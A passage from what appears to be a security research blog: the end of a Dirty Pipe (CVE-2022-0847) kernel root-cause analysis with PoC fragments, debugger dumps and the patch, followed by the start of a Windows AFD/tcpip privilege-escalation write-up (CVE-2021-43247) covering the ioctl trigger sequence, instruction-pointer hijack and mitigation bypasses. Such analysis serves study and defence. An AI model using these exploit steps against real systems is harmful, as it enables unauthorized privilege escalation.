pipe_inode_info at 0xffff8881044aec00 \u0026gt; \u0026#39;head\u0026#39;: 1 \u0026gt; \u0026#39;tail\u0026#39;: 1 \u0026gt; \u0026#39;ring_size\u0026#39;: 1 \u0026gt; \u0026#39;bufs\u0026#39;: 0xffff888101f8a180 struct pipe_buffer at 0xffff888101f8a180 \u0026gt; \u0026#39;page\u0026#39;: 0xffffea00040e3bc0 \u0026gt; \u0026#39;offset\u0026#39;: 4096 \u0026gt; \u0026#39;len\u0026#39;: 0 \u0026gt; \u0026#39;ops\u0026#39;: NULL \u0026gt; \u0026#39;flags\u0026#39;: PIPE_BUF_FLAG_CAN_MERGE Summary For us, the key takeaways are:\nWrites to a pipe can append to the page of a pipe_buffer if its PIPE_BUF_FLAG_CAN_MERGE flag is set. This flag is set by default for buffers that are initialized by writes. Emptying a pipe with a read() leaves the pipe_buffers\u0026rsquo; flags unmodified. However, writes to a pipe are not the only way fill it!\nPipes (splicing) Besides reading and writing, the Linux programming interface also offers the splice syscall for moving data from or to a pipe. This is what our PoC does next.\npause_for_inspection(\u0026#34;About to splice() file to pipe\u0026#34;); if (splice(tfd, 0, pipefds[1], 0, 5, 0) \u0026lt; 0) { exit(1); } ⬀ go to source code Since this syscall may not be as well-known as the others, let\u0026rsquo;s briefly discuss it from a user\u0026rsquo;s perspective.\nThe splice System Call (user land) SPLICE(2) Linux Programmer\u0026#39;s Manual SPLICE(2) NAME splice - splice data to/from a pipe SYNOPSIS #define _GNU_SOURCE /* See feature_test_macros(7) */ #include \u0026lt;fcntl.h\u0026gt; ssize_t splice(int fd_in, off64_t *off_in, int fd_out, off64_t *off_out, size_t len, unsigned int flags); DESCRIPTION splice() moves data between two file descriptors without copying between kernel address space and user address space. It transfers up to len bytes of data from the file descriptor fd_in to the file descriptor fd_out, where one of the file descriptors must refer to a pipe. The following semantics apply for fd_in and off_in: * If fd_in refers to a pipe, then off_in must be NULL. * If fd_in does not refer to a pipe and off_in is NULL, then bytes are read from fd_in starting from the file offset, and the file offset is adjusted appropri‐ ately. * If fd_in does not refer to a pipe and off_in is not NULL, then off_in must point to a buffer which specifies the starting offset from which bytes will be read from fd_in; in this case, the file offset of fd_in is not changed. Analogous statements apply for fd_out and off_out. As mentioned above, a process can obtain a file descriptor using the sys_open system call. If the process wishes to write the file content (or a part of it) into a pipe it has different options. It could read() the data from the file into a buffer in its memory (or mmap() the file) and then write() it to the pipe. However, this involves a total of three context switches (kernel-user-space boundary). To make this whole operation more efficient the Linux kernel implements the sys_splice system call. It essentially does the copying (not really a copy, see below) directly from one file descriptor to another one within the kernel space. As we will see, this makes a lot of sense because the content of a file or a pipe is already present in the kernel memory as a buffer or page or another structure. One of fd_in or fd_out must be a pipe. The other fd_xxx can be another pipe, a file, a socket, a block device, a character device. See Max Kellermann\u0026rsquo;s original blog post for an example how splicing is used to optimize real-world software (and how this application lead him to finding this bug :) Check out this to read how Linus Torvalds himself explains the splice system call 8-)\nThe splice System Call (Implementation) The very high level idea of the splice implementation is illustrated in the following figure. After splicing, both, the pipe and the page cache, have different views of the same underlying data in memory. You might want to open this SVG image in a new tab and zoom in a bit. To see that this figure is correct, we start from the system call\u0026rsquo;s entry point SYSCALL_DEFINE6(splice,...), and first arrive at the function __do_splice() that is responsible for copying the offset values from and to user space. The called function do_splice() determines if we want to splice to, from or between pipes. In the first case the function\nstatic long do_splice_to(struct file *in, loff_t *ppos, struct pipe_inode_info *pipe, size_t len, unsigned int flags); is called, which executes\nin-\u0026gt;f_op-\u0026gt;splice_read(in, ppos, pipe, len, flags); ⬀ go to source code From here on, the execution path depends on the type of file we want to splice to the pipe. Since our target is a regular file and our VM uses the ext2 file system, the correct implementation is found in ext2_file_operations. Note: If you debug the exploit on another machine with e.g. ext4 file system, feel free to follow this path\u0026hellip; we\u0026rsquo;ll meet again later ;) If you interested in this nice abstraction check out the Linux Virtual File System documentation.\nconst struct file_operations ext2_file_operations = { ... .read_iter = ext2_file_read_iter, ... .splice_read = generic_file_splice_read, ... }; ⬀ go to source code Calling generic_file_splice_read() (eventually\u0026hellip;) leads us to filemap_read(). Notice that at this point we switch from the file system fs/ into the memory management mm/ subsystem of the kernel.\n/** * filemap_read - Read data from the page cache. * @iocb: The iocb to read. * @iter: Destination for the data. * @already_read: Number of bytes already read by the caller. * * Copies data from the page cache. If the data is not currently present, * uses the readahead and readpage address_space operations to fetch it. * * Return: Total number of bytes copied, including those already read by * the caller. If an error happens before any bytes are copied, returns * a negative error number. */ ssize_t filemap_read(struct kiocb *iocb, struct iov_iter *iter, ssize_t already_read) { struct file *filp = iocb-\u0026gt;ki_filp; struct file_ra_state *ra = \u0026amp;filp-\u0026gt;f_ra; struct address_space *mapping = filp-\u0026gt;f_mapping; struct inode *inode = mapping-\u0026gt;host; struct folio_batch fbatch; ... folio_batch_init(\u0026amp;fbatch); ... do { ... error = filemap_get_pages(iocb, iter, \u0026amp;fbatch); ... for (i = 0; i \u0026lt; folio_batch_count(\u0026amp;fbatch); i++) { struct folio *folio = fbatch.folios[i]; size_t fsize = folio_size(folio); size_t offset = iocb-\u0026gt;ki_pos \u0026amp; (fsize - 1); size_t bytes = min_t(loff_t, end_offset - iocb-\u0026gt;ki_pos, fsize - offset); size_t copied; ... copied = copy_folio_to_iter(folio, offset, bytes, iter); already_read += copied; iocb-\u0026gt;ki_pos += copied; ra-\u0026gt;prev_pos = iocb-\u0026gt;ki_pos; ... } ... folio_batch_init(\u0026amp;fbatch); } while (iov_iter_count(iter) \u0026amp;\u0026amp; iocb-\u0026gt;ki_pos \u0026lt; isize \u0026amp;\u0026amp; !error); ... ⬀ go to source code In this function the actual copying (again no real byte-for-byte copy\u0026hellip; see below) of data from the page cache to the pipe takes place. In a loop, the data is copied in chunks by the call to copy_folio_to_iter(). Note that a folio is not quite the same as a page, but for our purposes this doesn\u0026rsquo;t matter.\ncopied = copy_folio_to_iter(folio, offset, bytes, iter); Besides, however, that if we look closer at the implementation of this operation in copy_page_to_iter_pipe(), we notice that the data is not actually copied at all!\nstatic size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t bytes, struct iov_iter *i) { ... struct pipe_inode_info *pipe = i-\u0026gt;pipe; struct pipe_buffer *buf; unsigned int p_mask = pipe-\u0026gt;ring_size - 1; unsigned int i_head = i-\u0026gt;head; size_t off; ... off = i-\u0026gt;iov_offset; buf = \u0026amp;pipe-\u0026gt;bufs[i_head \u0026amp; p_mask]; if (off) { if (offset == off \u0026amp;\u0026amp; buf-\u0026gt;page == page) { /* merge with the last one */ buf-\u0026gt;len += bytes; i-\u0026gt;iov_offset += bytes; goto out; } i_head++; buf = \u0026amp;pipe-\u0026gt;bufs[i_head \u0026amp; p_mask]; } ... buf-\u0026gt;ops = \u0026amp;page_cache_pipe_buf_ops; get_page(page); buf-\u0026gt;page = page; buf-\u0026gt;offset = offset; buf-\u0026gt;len = bytes; ... ⬀ go to source code We first try to \u0026lsquo;append\u0026rsquo; the current copy operation to an earlier one by increasing the length of the pipe_buffer at head. In case this is not possible, we simply advance the head and put a reference to the page we copy into its page field while making sure that offset and length are set correctly. Indeed, the idea behind the efficiency of sys_splice is to implement it as a zero-copy operation, where pointers and reference counts are used instead of actually duplicating the data.\nClearly this code potentially reuses the pipe_buffers (buf = \u0026amp;pipe-\u0026gt;bufs[i_head \u0026amp; p_mask]), and thus all fields must be checked and maybe re-initialized (there exist some old values, that might not be correct anymore). In particular, the initialization of the flags is missing. As pointed out by Max Kellermann, it was missing since the commit that introduced this function.\nDebugger We can also observe the effect of the zero-copy operation and missing initialization in the debugger. This is the output from earlier,\nstruct file at 0xffff8881045b0800 \u0026gt; \u0026#39;f_mapping\u0026#39;: 0xffff8881017d9460 \u0026gt; filename: target_file struct address_space at 0xffff8881017d9460 \u0026gt; \u0026#39;a_ops\u0026#39;: 0xffffffff82226ce0 \u0026lt;ext4_aops\u0026gt; \u0026gt; \u0026#39;i_pages.xa_head\u0026#39; : 0xffffea0004156880 struct page at 0xffffea0004156880 \u0026gt; virtual: 0xffff8881055a2000 \u0026gt; data: b\u0026#39;File owned by root!\\n\u0026#39;[...]b\u0026#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#39; and this is the state of the pipe after splicing\nstruct pipe_inode_info at 0xffff8881044aec00 \u0026gt; \u0026#39;head\u0026#39;: 2 \u0026gt; \u0026#39;tail\u0026#39;: 1 \u0026gt; \u0026#39;ring_size\u0026#39;: 1 \u0026gt; \u0026#39;bufs\u0026#39;: 0xffff888101f8a180 struct pipe_buffer at 0xffff888101f8a180 \u0026gt; \u0026#39;page\u0026#39;: 0xffffea0004156880 \u0026lt;- same page as before \u0026gt; \u0026#39;offset\u0026#39;: 0 \u0026gt; \u0026#39;len\u0026#39;: 5 \u0026gt; \u0026#39;ops\u0026#39;: 0xffffffff8221cee0 \u0026lt;page_cache_pipe_buf_ops\u0026gt; \u0026gt; \u0026#39;flags\u0026#39;: PIPE_BUF_FLAG_CAN_MERGE \u0026lt;- flag still set... oopsie :) The data pointer in the struct address_space (which represents the page cache\u0026rsquo;s view on the target_file) and the pipe_buffer at head are equal, while the offset and length reflect what our PoC specified in its call to splice. Note that we are reusing the buffer we emptied earlier, re-initializing all fields but the flags.\nWhat\u0026rsquo;s the Actual Problem? At this point the problem becomes evident. With anonymous pipe buffers it is allowed to continue the writing where the previous write stopped, which is indicated by the PIPE_BUF_FLAG_CAN_MERGE flag. With the file-backed buffers, created by splicing, this should not be allowed by the kernel since those pages are \u0026ldquo;owned\u0026rdquo; by the page cache and not by the pipe.\nThus, when we splice() the data from a file into a pipe we would have to set buf-\u0026gt;flags = 0 to indicate that it is not okay to append data to an already existing - not fully written - page (buf-\u0026gt;page) since this page belongs to the page cache (the file). When we pipe_write() (or in our program just write()) again we write into the page cache\u0026rsquo;s page because the check buf-\u0026gt;flags \u0026amp; PIPE_BUF_FLAG_CAN_MERGE is true (see pipe_write above if you forgot about that part).\nSo the main problem is that we start with an anonymous pipe that will then be \u0026ldquo;turned into\u0026rdquo; a file-backed pipe (not the whole pipe but some buffers) by the splice() but the pipe does not get this information since buf-\u0026gt;flags is not set to 0 and thus the merging is still allowed.\nThe patch is simply adding the missing initialization.\ndiff --git a/lib/iov_iter.c b/lib/iov_iter.c index b0e0acdf96c15e..6dd5330f7a9957 100644 --- a/lib/iov_iter.c +++ b/lib/iov_iter.c @@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by return 0; buf-\u0026gt;ops = \u0026amp;page_cache_pipe_buf_ops; + buf-\u0026gt;flags = 0; get_page(page); buf-\u0026gt;page = page; buf-\u0026gt;offset = offset; As we can see above, our PoC arranged for the PIPE_BUF_FLAG_CAN_MERGE flag to be set on the pipe buffer re-used for the splice. Thus, the last write will trigger the bug.\npause_for_inspection(\u0026#34;About to write() into page cache\u0026#34;); if (write(pipefds[1], \u0026#34;pwned by user\u0026#34;, 13) != 13) { exit(1); } ⬀ go to source code Back in the debugger, we can see that the final invocation of pipe_write() appends to the partially filled pipe_buffer that is backed by the page cache.\nstruct address_space at 0xffff8881017d9460 \u0026gt; \u0026#39;a_ops\u0026#39;: 0xffffffff82226ce0 \u0026lt;ext4_aops\u0026gt; \u0026gt; \u0026#39;i_pages.xa_head\u0026#39; : 0xffffea0004156880 struct pipe_inode_info at 0xffff8881044aec00 \u0026gt; \u0026#39;head\u0026#39;: 2 \u0026gt; \u0026#39;tail\u0026#39;: 1 \u0026gt; \u0026#39;ring_size\u0026#39;: 1 \u0026gt; \u0026#39;bufs\u0026#39;: 0xffff888101f8a180 struct pipe_buffer at 0xffff888101f8a180 \u0026gt; \u0026#39;page\u0026#39;: 0xffffea0004156880 \u0026gt; \u0026#39;offset\u0026#39;: 0 \u0026gt; \u0026#39;len\u0026#39;: 18 \u0026gt; \u0026#39;ops\u0026#39;: 0xffffffff8221cee0 \u0026lt;page_cache_pipe_buf_ops\u0026gt; \u0026gt; \u0026#39;flags\u0026#39;: PIPE_BUF_FLAG_CAN_MERGE struct page at 0xffffea0004156880 \u0026gt; virtual: 0xffff8881055a2000 \u0026gt; data: b\u0026#39;File pwned by user!\\n\u0026#39;[...]b\u0026#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#39; Here we can see that owned by root (starting at index 5 of \u0026ldquo;File owned by root!\u0026rdquo;) has been overwritten with pwned by user in the page cache.\nIn the shell we can confirm that the file contents changed for all processes on the system\nuser@lkd-debian-qemu:~$ ./poc user@lkd-debian-qemu:~$ cat target_file File pwned by user! user@lkd-debian-qemu:~$ exit root@lkd-debian-qemu:~# echo 1 \u0026gt; /proc/sys/vm/drop_caches [ 232.397273] bash (203): drop_caches: 1 root@lkd-debian-qemu:~# su user user@lkd-debian-qemu:~$ cat target_file File owned by root You can also see that the changes to the file\u0026rsquo;s page cache data are not written back to disk. After clearing the page cache, the old content appears again. But, all other programs would use the modified version from the page cache since the kernel transparently offers you the cached version of the file data (that\u0026rsquo;s the purpose of the page cache).\nLimitations There are some inherent limitations to the writes that we can perform using this technique that are due to implementation of the pipe and page cache that Max Kellermann mentions:\nthe attacker must have read permissions (because it needs to splice() a page into a pipe)\nthe offset must not be on a page boundary (because at least one byte of that page must have been spliced into the pipe)\nthe write cannot cross a page boundary (because a new anonymous buffer would be created for the rest)\nthe file cannot be resized (because the pipe has its own page fill management and does not tell the page cache how much data has been appended)\nApproaches to Understand the Bug Top Down vs. Bottom Up vs. Hybrid Given a PoC and a patch there are different approaches to investigate the vulnerability.\nTop Down: find the splice(), write(), read() system call implementation and go deeper.\nBottom Up: have a look at the fix: https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903 diff --git a/lib/iov_iter.c b/lib/iov_iter.c index b0e0acdf96c15e..6dd5330f7a9957 100644 --- a/lib/iov_iter.c +++ b/lib/iov_iter.c @@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by return 0; buf-\u0026gt;ops = \u0026amp;page_cache_pipe_buf_ops; + buf-\u0026gt;flags = 0; get_page(page); buf-\u0026gt;page = page; buf-\u0026gt;offset = offset; @@ -577,6 +578,7 @@ static size_t push_pipe(struct iov_iter *i, size_t size, break; buf-\u0026gt;ops = \u0026amp;default_pipe_buf_ops; + buf-\u0026gt;flags = 0; buf-\u0026gt;page = page; buf-\u0026gt;offset = 0; buf-\u0026gt;len = min_t(ssize_t, left, PAGE_SIZE); find lib/iov_iter.c (more concrete the functions copy_page_to_iter_pipe() and push_pipe()) and your way back to the system calls. Hybrid: start from splice() system call but know where we will end (either of the patched functions from above)\nLinux Kernel Source Access to the source code:\nhttps://github.com/torvalds/linux + ctags + cscope (make cscope tags) or an IDE that is capable of creating cross references (might be very resource hungry because of the kernel\u0026rsquo;s size!) https://elixir.bootlin.com/linux/v5.17.9/source (cross references already created + no need for extra tools) When reading kernel source code for the first time, you might encounter some obstacles. In general it is easy to get lost and thus you should always keep in mind what it is that you are interested in finding / understanding. We must also understand that it is impossible to understand every line of the code that we look at. Use a best-effort approach to understand the things that get you closer to you goal). You will encounter:\nlots of error checking: in general very interesting, however, here we ignore it (i.e. return -EXYZ code paths) many layers of macros, (inlined) function calls and definitions: collect everything and simplify it. Note: you cannot set breakpoints on macros, which might be a problem as well. structures full of function pointers: for example, look under \u0026ldquo;Referenced in [\u0026hellip;] files\u0026rdquo; on https://elixir.bootlin.com \u0026ldquo;decide\u0026rdquo; for some implementation (in our case ext2 file system) conditional compilation depending on: compile time options: check the config files you used for your build .config processor architecture: go for x86-64 if present, else take the generic version Conclusion A detailed and streamlined analysis of any bug makes it seem shallow, however, don\u0026rsquo;t get fooled by that impression. Making sense of the bug requires a conceptual understanding of multiple interacting subsystems of the Linux kernel. A root cause analysis without a PoC, blog post, or patch at hand would be a tricky task. In general, the nature of this bug makes it a great opportunity to learn about the Linux kernel. A missing initialization is a welcome diversion from the ubiquitous memory corruption issues (that a lot of exploit developers love ;)). Furthermore, in contrast to those kind of vulnerabilities, the exploitation of this one is almost trivial, stable, and it works across a huge range of Linux distributions. Maybe you got motivated to check out some more complex vulnerabilities / exploits or the Linux kernel yourself :).\n","permalink":"https://lolcads.github.io/posts/2022/06/dirty_pipe_cve_2022_0847/","tags":["Linux","kernel","LPE","pipe","splice","page cache","debugging"],"title":"Exploration of the Dirty Pipe Vulnerability (CVE-2022-0847)"},{"categories":null,"content":"In this blog post I will go in depth into the inner workings of CVE-2021-43247 , which was fixed on the 14th of December 2021. This bug was classified as \u0026ldquo;Windows TCP/IP Driver Elevation of Privilege Vulnerability\u0026rdquo;. The vulnerability itself was probably dormant for a long time, but became exploitable when the AF_UNIX address family was first introduced in 2019.\nI will also take this as an excuse to explain in detail, what drivers are, how user space communicates with drivers, what a Local Privilege Escalation (LPE) is and what how we can achieve it in this case.\nThe goal / what is an LPE (Local Privilege Escalation) A Local Privilege Escalation (sometimes also called Elevation of Privilege or EoP) is an exploit which obtains some privilege that it is not supposed to be able to get. In the traditional cases (as in this one) this means we start out with at normal user shell and end up with administrator access. On Linux this would be about obtaining a root shell. This is usually done through a bug in a privileged process, a bug in a driver or a bug in the operating system itself.\nAs the CVE description tells us, we are dealing with a bug in the TCP/IP driver.\nWhat are drivers and how does user space communicate with them? Drivers are simply PE files , which the kernel loads into the kernel address space. PE (Portable Executable) is the executable file format used by Windows, it\u0026rsquo;s used by \u0026ldquo;.exe\u0026rdquo; and \u0026ldquo;.dll\u0026rdquo; files. Drivers usually have the file extension \u0026ldquo;.sys\u0026rdquo;, but there are also library drivers which also get the \u0026ldquo;.dll\u0026rdquo; file extension. Most drivers are contained in the \u0026ldquo;C:\\windows\\system32\\drivers\u0026rdquo; directory. What drivers are loaded on system startup is determined by the registry and the physical devices available to the system.\nUser space can communicate with the loaded drivers using kernel system calls (or syscalls for short). For example, consider the program\n// blog_socket.c - small example program used in this blog #include \u0026lt;winsock.h\u0026gt; int main() { // Initialize WinSock WSAStartup(MAKEWORD(2, 2), \u0026amp;(WSADATA){0}); // Create a TCP/IPv4 socket. SOCKET Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // Bind the socket to any address bind(Socket, \u0026amp;(struct sockaddr){AF_INET}, sizeof(struct sockaddr)); } Then we can observe the following call stack:\n00 ntdll!NtCreateFile 01 mswsock!SockSocket+0x56e 02 mswsock!WSPSocket+0x23a 03 WS2_32!WSASocketW+0x130 04 WS2_32!socket+0x6e 05 blog_socket!main+0x84 ntdll!NtCreateFile is the function that actually transitions into the kernel address space. The assembly for all ntdll!NtXxx functions looks something like the following:\nNtCreateFile: mov r10, rcx ; load the first argument into r10, as the syscall ; instruction uses rcx as the return location mov eax, 0x55 ; load the syscall value into eax (0x55 is \u0026#39;NtCreateFile\u0026#39;) test byte ptr [.Running32Bit], 1 ; check if we are running a 32bit executable jnz .Syscallx86 ; syscall transitions into the kernel. systcall ret .Syscallx86: ; x86 does not have a syscall instruction, use int 0x2e instead of syscall. int 0x2e ret We will only focus on the x64 case here. The syscall instruction loads the new instruction pointer from a specialized hardware registers (called a model specific register or MSR). Namely, the MSR IA32_LSTAR. It also stores the return address (in this case the address of the ret instruction) into rcx and sets the privilege level of the processor to 0. This is why kernel mode is sometimes referred to as ring 0.\nWhen the processor is running at privilege level 0, it can access kernel space memory. Here it is important to know that the address space does not change, but at non-zero privilege level the processor faults when it is accessing a page which does not have the USER bit set in the page table.\nIn Windows 10 the IA32_LSTAR MSR points to the function nt!KiSystemCall64, which first establishes a stack pointer:\nKiSystemCall64: swapgs ; load saved kernel thread locals from some MSR mov gs:[gs.user_stack], rsp ; save user stack, in the kernel thread locals mov rsp, gs:[gs.kernel_stack] ; load kernel space stack, from the thread locals ; ... from here we are just in kernel space, and can do whatever we want ; e.g. Save all the registers and then call the according NtXxx ; kernel function depending on eax. The kernel then figures out what kernel function was requested by looking at eax and transitions to it. In this case we end up in nt!NtCreateFile (on the kernel side).\n00 nt!NtCreateFile \u0026lt;-- Kernel space function 01 nt!KiSystemServiceCopyEnd+0x25 02 ntdll!NtCreateFile+0x14 \u0026lt;-- User space function 03 mswsock!SockSocket+0x4ec 04 mswsock!WSPSocket+0x233 05 WS2_32!WSASocketW+0x1be 06 WS2_32!socket+0x9b Note that the address space is still the same, as in user space. The difference being that we are now allowed to access kernel memory. The arguments to nt!NtCreateFile are unchanged from the arguments ntdll!NtCreateFile received. The kernel very carefully validates all arguments and copies them safely to kernel space memory.\nIn this case \u0026ldquo;mswsock.dll\u0026rdquo; tries to open a HANDLE to AFD or the \u0026ldquo;Ancillary Function Driver for WinSock\u0026rdquo;.\nAFD AFD is located at \u0026ldquo;C:\\windows\\system32\\drivers\\afd.sys\u0026rdquo; and provides implementations for the usual socket functions.\nAs I have hopefully been able to convince you the socket function corresponds to opening a HANDLE to AFD using NtCreateFile. Using the HANDLE returned by NtCreateFile, communication occurs via the NtDeviceIoControlFile:\n__kernel_entry NTSTATUS NtDeviceIoControlFile( [in] HANDLE FileHandle, [in] HANDLE Event, [in] PIO_APC_ROUTINE ApcRoutine, [in] PVOID ApcContext, [out] PIO_STATUS_BLOCK IoStatusBlock, [in] ULONG IoControlCode, [in] PVOID InputBuffer, [in] ULONG InputBufferLength, [out] PVOID OutputBuffer, [in] ULONG OutputBufferLength ); Here, each different socket function corresponds to an IoControlCode or ioctl for short. For example, if we bind the socket we end up in afd!AfdBind\n00 afd!AfdBind 01 afd!AfdDispatchDeviceControl+0x7d 02 nt!IofCallDriver+0x59 03 nt!IopSynchronousServiceTail+0x1b1 04 nt!IopXxxControlFile+0xe0c 05 nt!NtDeviceIoControlFile+0x56 06 nt!KiSystemServiceCopyEnd+0x25 07 ntdll!NtDeviceIoControlFile+0x14 08 mswsock!WSPBind+0x278 09 WS2_32!bind+0xdf 0a blog_socket!main+0x137 Similarly, recv corresponds to AfdReceive, send corresponds to AfdSend and so on. The arguments and return values of these functions are serialized into the InputBuffer and OutputBuffer, respectively.\nThe Bug The bug combines three different features that Windows 10 provides. The TCP_FASTOPEN option, the ConnectEx/AfdSuperConnect function and the AF_UNIX address family.\nTCP_FASTOPEN Taken from Wikipedia , the TCP_FASTOPEN option allows the client under certain conditions to start sending data to the host without waiting for the ACK packet. For us, what it does is not important, only that it is necessary to call AfdSuperConnect later on.\nAF_UNIX As mentioned by this blog, the vulnerability probably turned exploitable when Windows started supporting sockets of type AF_UNIX.AF_UNIX sockets provide a means of inter-process communication. For us the important fact is that the associated sockaddr looks like this:\n#define UNIX_PATH_MAX 108 typedef struct sockaddr_un { ADDRESS_FAMILY sun_family; /* AF_UNIX */ char sun_path[UNIX_PATH_MAX]; /* pathname */ } SOCKADDR_UN, *PSOCKADDR_UN; And therefore, with a size of 110 = 0x6e is quite large.\nConnectEx The ConnectEx function is a Microsoft specific extension , which can be queried using WSAIoctl. The underlying kernel function is AfdSuperConnect. Sadly, the user space API validates the arguments to ConnectEx and therefore we are forced to call it using NtDeviceIoControlFile directly. The socket functions do not expose the underlying handles to AFD. This forces us to use NtCreateFile and NtDeviceIoControlFile directly for all communication with AFD.\nAfdSuperConnect gets invoked when using NtDeviceIoControlFile with the ioctl 0x120c7. The input buffer for this call consists of 10 bytes, most of which seem to be unused and then any sockaddr. The vulnerability occurs when AfdSuperConnect attempts to connect to a sockaddr of type AF_UNIX.\nThe Setup Create an AF_INET socket using NtCreateFile. Enable the TCP_FASTOPEN option using AfdTliIoControl (NtDeviceIoControlFile with ioctl 0x120bf). Bind the socket to any address using ioctl AfdBind (NtDeviceIoControlFile with ioctl 0x12003). Trigger the vulnerability by using AfdSuperConnect (NtDeviceIoControlFile with ioctl 0x120c7) passing a sockaddr of type AF_UNIX. As we opened the socket as an AF_INET socket, the call to AfdSuperConnect ends up in tcpip!TcpTlProviderConnectAndSend.\n00 tcpip!TcpTlProviderConnectAndSend 01 afd!AfdSuperConnect+0x10b26 02 afd!AfdDispatchDeviceControl+0x7d 03 nt!IofCallDriver+0x59 04 nt!IopSynchronousServiceTail+0x1b1 05 nt!IopXxxControlFile+0xe0c 06 nt!NtDeviceIoControlFile+0x56 tcpip!TcpCreateConnectTcb checks early on whether the TCP_FASTOPEN option is enabled and if it is not it returns with the error code STATUS_RETRY. If it is, it allocates a big internal structure and later on copies the sockaddr we provided into the internal structure.\n// Ghidra Decompilation from (tcpip!TcpCreateConnectTcb) SockaddrFamily = *TlConnect-\u0026gt;ConnectSockaddr; if (SockaddrFamily \u0026lt; 0x23) { sockaddr_size = (\u0026amp;::sockaddr_size)[SockaddrFamily]; } /* this is where the magic happens */ memcpy(\u0026amp;_Dst-\u0026gt;contains_the_function_pointer-\u0026gt;sockaddr, TlConnect-\u0026gt;ConnectSockaddr, sockaddr_size); Crucially, as this is all happening in \u0026ldquo;tcpip.sys\u0026rdquo;, the code only expects a sockaddr of type AF_INET or AF_INET6 which are of size 0x1c and 0x24, respectively. Hence, tcpip only reserves 0x24 bytes of memory for said sockaddr and we can overwrite 0x6e - 0x24 bytes after the size reserved for the sockaddr. Fortunately for us, this range of bytes contains a callback function pointer (originally pointing to afd!AfdTLBufferedSendComplete) and its callback context argument.\nPrior to the vulnerable memcpy:\nkd\u0026gt; dq rax + f8 L2 ffffac8e`6702a138 fffff806`2d0db540 ffffac8e`6841c9e0 kd\u0026gt; ln fffff806`2d0db540 (fffff806`2d0db540) afd!AfdTLBufferedSendComplete After the vulnerable memcpy:\nkd\u0026gt; dq ffffac8e`6702a138 L2 ffffac8e`6702a138 13371337`13371337 deaddead`deaddead The call to tcpip!TcpTlProviderConnectAndSend eventually fails, returning a status code of STATUS_INVALID_ADDRESS_COMPONENT, but not before trying to \u0026ldquo;complete\u0026rdquo; the request, by calling the callback function pointer, passing its callback context as the first argument.\nBreakpoint 3 hit tcpip!guard_dispatch_icall_nop: fffff803`11e36490 ffe0 jmp rax kd\u0026gt; r rax, rcx rax=1337133713371337 rcx=deaddeaddeaddead kd\u0026gt; k # Child-SP RetAddr Call Site 00 ffffeb0f`32dc18e8 fffff803`11d767fd tcpip!guard_dispatch_icall_nop 01 ffffeb0f`32dc18f0 fffff803`11d73840 tcpip!TcpCreateAndConnectTcbComplete+0xc39 02 ffffeb0f`32dc1b30 fffff803`11d88e2a tcpip!TcpShutdownTcb+0x1040 03 ffffeb0f`32dc1f20 fffff803`11d88d38 tcpip!TcpCreateAndConnectTcbInspectConnectComplete+0xba 04 ffffeb0f`32dc2000 fffff803`11d87be8 tcpip!TcpContinueCreateAndConnect+0x1044 05 ffffeb0f`32dc2220 fffff803`11d87998 tcpip!TcpCreateAndConnectTcbInspectConnectRequestComplete+0x118 06 ffffeb0f`32dc2330 fffff803`11d8709d tcpip!TcpCreateAndConnectTcbWorkQueueRoutine+0x8a8 07 ffffeb0f`32dc2450 fffff803`11ea2247 tcpip!TcpCreateAndConnectTcb+0xcb5 08 ffffeb0f`32dc25d0 fffff803`11995606 tcpip!TcpTlProviderConnectAndSend+0x17 09 ffffeb0f`32dc2600 fffff803`1198958d afd!AfdSuperConnect+0x10b26 Exploitability, Mitigations and Complications As we have seen, the vulnerability gives us full control of the instruction pointer rip and the first argument rcx, and does so by calling into a function pointer we can freely choose. A vulnerability this good is almost always exploitable. But we first have to jump through some loops\u0026hellip;\nSMEP (Supervisor Mode Execution Prevention) The simplest idea to exploit a bug of this kind would be to set the instruction pointer to a user space address, i.e write some shellcode that when executed in kernel mode will elevate permissions of the current process. Sadly, Intel thought of this long ago and introduced SMEP. SMEP uses the fact that user-pages have the USER flag set in the page tables to throw an exception when the kernel executes any user address.\nASLR (Address Space Layout Randomization) Okay, so just executing user space code is out of the question, but what if we first load our shellcode into the kernel? First of, though it sounds hard, it is actually really easy to allocate arbitrary rwx-memory into kernel space using pipes:\nchar rwx_memory [0x100] = { \u0026lt;my_shellcode\u0026gt; }; // cannot contain zeroes HANDLE read_pipe; HANDLE write_pipe; CreatePipe (\u0026amp;read_pipe, \u0026amp;write_pipe, NULL, NULL); // ends up in \u0026#39;NpSetAttribute\u0026#39; NtFsControlFile(write_pipe, NULL, NULL, NULL, \u0026amp;status, 0x11003C, rwx_memory, sizeof(rwx_memory), output, sizeof(output)); But as far as I know, there is no way for us to know where this allocation will end up (without another exploit or administrator privileges which would defeat the purpose). Even if we could control the heap perfectly we do not know where the heap starts. This is because of ASLR (Address Space Layout Randomization). At system startup, Windows randomizes all addresses it will use during runtime.\nSo\u0026hellip;? Can we somehow get or leak addresses (or pointers) from the kernel? Fortunately, Windows is very nice to us in this respect. There is a user space function called NtQuerySystemInformation, which can be used to retrieve a lot of different kinds of information depending on an InformationClass. The InformationClass we are interested in is SystemModuleInformation. Using it, we can obtain the loaded base address of every currently running driver on the system, including the kernel (ntoskrnl.exe) itself.\nBy parsing the images contained on disk and using these base addresses, we know the address of every exported kernel function. One could go one step further and look at all symbols using the public symbols (.pdb) provided by Microsoft, but for our purposes restricting the search to exported functions was enough.\nCFG (Control Flow Guards) Okay, the plan is to call exported kernel functions, but there (potentially) is one more obstacle in our way the CFG (Control Flow Guard) mitigation. I did not emphasize this above, but looking at the call stack to the vulnerable call we can see that we are inside of a function called guard_dispatch_icall_nop. This means that control flow guards are disabled. If they were enabled we would instead be inside nt!guard_dispatch_icall. nt!guard_dispatch_icall checks whether the address we are jumping to is registered as a CFG target. If the target is not registered, nt!guard_dispatch_icall crashes the system (mitigating the exploit). This registration happens when the driver is loaded. The binary contains information on which functions are valid CFG targets.\nYou can also view the CFG information using dumpbin:\n\u0026gt; dumpbin /loadconfig 